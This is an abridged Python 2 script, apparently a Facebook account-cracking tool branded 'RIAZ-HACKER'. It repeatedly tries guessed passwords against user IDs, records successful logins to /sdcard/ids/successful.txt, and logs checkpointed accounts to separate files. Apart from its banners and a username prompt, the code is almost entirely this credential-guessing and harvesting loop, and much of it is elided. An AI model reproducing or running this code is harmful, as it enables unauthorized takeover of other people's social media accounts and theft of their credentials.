...
__author__ = 'RIAZ'
__copyright = 'All rights reserved . Copyright  RIAZ-KHAN'
CorrectUsername = 'riazkhan'
os.system('clear')
loop = 'true'
while (loop == 'true'):
    username = raw_input('\033[1;91mriazkhan')
...
def animate():
    for c in itertools.cycle(['\x1b[1;91m||', '\x1b[1;92m/', '\x1b[1;93m\xe2\x94\x80', '\x1b[1;96m|', '\x1b[1;95m\\']):
        if done:
            break
        sys.stdout.write('\r\x1b[1;93m______RIAZ\x1b[1;94m:) ' + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c )  
        sys.stdout.flush()
        time.sleep(0.1)
...
logo = """
         ...
         \x1b[1;97m   ######   ######  ########                                     
\033[1;98m---------------------------------------------------------------
\033[1;98m\033[1;98m Author   :            RIAZ-HACKER
\033[1;98m\033[1;98m Facebook :         Mai Hon tera bao   
\033[1;98m\033[1;98m YOuTUBE :       https://youtube.com/channel/UCPOWtzNan9ff-E0RI66Wu2A      
\033[1;98m------------------------------------------------------
"""
...
def ms():
    ...
    if s == '1':
        ...
        print ''
        ms()
#s.system('xdg-open https://youtube.com/channel/UCPOWtzNan9ff-E0RI66Wu2A')
...
def wlogin(
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print ' \x1b[1;32m[RIAZ-OK] \x1b[1;32m' + c + user + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/ids/successful.txt', 'a')
                ok.write(c + user + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error']:
                print ' \x1b[1;33m[RIAZ-CP] ' + c + user + ' | ' + pass1 + '\x1b[0;97m'
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print ' \x1b[1;32m[RIAZ-OK] \x1b[1;32m' + c + user + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/successful.txt', 'a')
                    ok.write(c + user + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error']:
                    print ' \x1b[1;33m[RIAZ-CP] ' + c + user + ' | ' + pass2 + '\x1b[0;97m'
                    cp = open('checkpoint.txt', 'a')
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print ' \x1b[1;32m[RIAZ-OK] \x1b[1;32m' + c + user + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/successful.txt', 'a')
                        ok.write(c + user + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print ' \x1b[1;33m[RIAZ-CP] ' + c + user + ' | ' + pass3 + '\x1b[0;97m'
                        cp = open('checkpoint.txt', 'a')
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print ' \x1b[1;32m[RIAZ-OK] \x1b[1;32m' + c + user + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/successful.txt', 'a')
                            ok.write(c + user + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print ' \x1b[1;33m[RIAZ-CP] ' + c + user + ' | ' + pass4 + '\x1b[0;97m'
                            cp = open('checkpoint.txt', 'a')
...
def a_s():
    ...
    time.sleep(0.5)
    print 47 * '-'
    print '\t\x1b[1;92m   RIAZ________HACKER   '
    print 47 * '-'
...
def c_s():
    ...
    time.sleep(0.5)
    print 47 * '-'
    print '\t\x1b[1;92m  RIAZ_________HACKER     '
    os.system('echo -e "-----------------------------------------------"| lolcat')
            ...
            if 'loc' in q:
                ...
                if 'loc' in q:
                    ...
                    if 'loc' in q:
                        ...
                        print '\x1b[1;31;1m[SSB-CP] ' + uid + ' | ' + pass3
                        cp = open('S_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
